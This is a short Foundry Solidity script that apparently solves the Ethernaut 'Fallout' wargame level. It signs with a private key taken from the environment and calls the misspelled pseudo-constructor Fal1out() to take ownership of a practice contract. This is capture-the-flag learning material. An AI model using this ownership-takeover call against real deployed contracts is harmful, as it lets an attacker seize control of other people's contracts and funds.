pragma solidity ^0.8.13;
import "forge-std/Script.sol";
import "../../src/interfaces/IFallout.sol";

contract FalloutScript is Script {

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        address targetAddr = 0x5C301E7cb7fb64efC104A5f73867Afc754793F8D; // 替换为实例地址

        vm.startBroadcast(privateKey);
        IFallout target = IFallout(targetAddr);
        target.Fal1out();

        vm.stopBroadcast();
    }
}
